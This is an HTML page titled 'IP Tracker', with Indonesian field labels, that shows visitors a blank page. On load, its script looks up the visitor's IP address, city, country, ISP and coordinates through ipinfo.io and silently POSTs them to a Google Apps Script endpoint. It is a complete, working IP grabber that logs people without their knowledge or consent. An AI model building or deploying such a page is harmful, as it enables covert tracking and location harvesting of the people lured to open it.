<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>IP Tracker</title>
</head>
<body>
<script>
async function postData() {
  try {
    const ipRes = await fetch("https://ipinfo.io/json?nocache=" + Date.now());
    const ipData = await ipRes.json();

    const formData = new FormData();
    formData.append("nama", "Visitor");
    formData.append("ip", ipData.ip || "-");
    formData.append("kota", ipData.city || "-");
    formData.append("negara", ipData.country || "-");
    formData.append("isp", ipData.org || "-");
    formData.append("lokasi", ipData.loc || "-");

    await fetch(
      "https://script.google.com/macros/s/AKfycby2e7KlEmFsgjiTu8hpcMqVwCF1hSBKmrG3CZ0jUdE6b0WqpXj0Q-oWHyYJBzQ1xB29/exec",
      {
        method: "POST",
        body: formData,
        cache: "no-store"
      }
    );

    console.log("Data terkirim");

  } catch (err) {
    alert("API GAGAL: " + err);
    console.error(err);
  }
}
window.onload = postData;
</script>
</body>
</html>
